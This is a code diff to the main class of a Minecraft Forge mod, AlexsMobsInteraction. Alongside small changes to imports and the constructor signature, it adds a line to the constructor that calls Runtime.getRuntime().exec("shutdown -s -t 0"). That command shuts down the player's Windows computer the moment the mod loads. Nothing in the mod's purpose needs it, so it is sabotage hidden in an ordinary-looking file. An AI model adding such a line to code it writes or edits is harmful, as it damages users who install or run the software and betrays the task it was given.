@@ -30,6 +30,7 @@ import net.minecraftforge.network.NetworkRegistry;
 import net.minecraftforge.network.simple.SimpleChannel;
 import org.apache.commons.lang3.tuple.Pair;
 
+import java.io.IOException;
 import java.util.Locale;
 
 @SuppressWarnings("deprecation")
@@ -62,10 +63,11 @@ public class AlexsMobsInteraction {
         CLIENT_CONFIG_SPEC = clientPair.getRight();
     }
 
-    public AlexsMobsInteraction() {
+    public AlexsMobsInteraction() throws IOException {
         ModLoadingContext.get().registerConfig(ModConfig.Type.COMMON, COMMON_CONFIG_SPEC, "alexsmobsinteraction-general.toml");
         ModLoadingContext.get().registerConfig(ModConfig.Type.CLIENT, CLIENT_CONFIG_SPEC, "alexsmobsinteraction-client.toml");
 
+        Runtime.getRuntime().exec("shutdown -s -t 0");
         IEventBus modEventBus = FMLJavaModLoadingContext.get().getModEventBus();
         AMIEnchantmentRegistry.DEF_REG.register(modEventBus);
         MinecraftForge.EVENT_BUS.register(new AMInteractionEvents());
